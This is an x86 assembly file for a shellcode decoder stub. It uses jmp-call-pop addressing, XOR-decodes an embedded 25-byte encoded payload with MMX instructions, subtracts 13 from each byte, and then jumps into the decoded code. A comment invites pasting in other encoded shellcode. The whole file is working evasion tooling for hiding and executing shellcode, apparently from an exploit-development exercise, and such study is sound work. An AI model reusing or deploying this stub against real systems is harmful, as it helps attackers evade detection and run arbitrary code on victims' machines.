global _start			

section .text
_start:

	jmp short call_decoder

decoder1:
	pop edi								      ;"edi" now points to "xor_value"
	lea esi, [edi +16]					;"esi" now points to "Shellcode"
	xor ecx, ecx
	mov cl, 4							      ;Size of our shellcode is 25|"qword" operates 8bytes ata time hence 4*8=32|"loop" 4 times

XOR_decode:
	movq mm0, qword [edi]				;move 8bytes of "xor_value" to mm0
	movq mm1, qword [esi]				;move 8bytes of "Shellcode" to mm1
	pxor mm0, mm1						    ;Perform XOR operation
	movq qword [esi], mm0				;overwrite the "Shellcode" with previous results
	add esi, 0x8						    ;now "esi" points to next 8bytes of "Shellcode"
	loop XOR_decode						  ;loop 4 times

decoder2:
	lea edi, [edi +8]					  ;"edi" now points to "rot_value"
	lea esi, [edi +8]					  ;"esi" now points to "Shellcode"|"Shellcode" contains previous XOR'ed results
	xor ecx, ecx
	mov cl, 4							      ;"loop" 4 times

ROT_decode:
	movq mm2, qword [edi]				;move 8bytes of "rot_value" to mm2
	movq mm3, qword [esi]				;move 8bytes of "Shellcode" to mm3
	psubb mm3, mm2						  ;Subtract 13 from "Shellcode"
	movq qword [esi], mm3				;overwrite the "Shellcode" with previous results
	add esi, 0x8						    ;now "esi" points to next 8bytes of "Shellcode"
	loop ROT_decode						  ;"loop" 4 times
	
	jmp short Shellcode					;Execute decoded shellcode

call_decoder:

	call decoder1
	xor_value: db 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa
	rot_value: db 13, 13, 13, 13, 13, 13, 13, 13
  ;Paste your Encoded shellcode below
	Shellcode: db 0x94,0x67,0xf7,0xdf,0x96,0x96,0x2a,0xdf,0xdf,0x96,0xc5,0xdc,0xd1,0x3c,0x5a,0xf7,0x3c,0x45,0xca,0x3c,0x44,0x17,0xb2,0x70,0x27
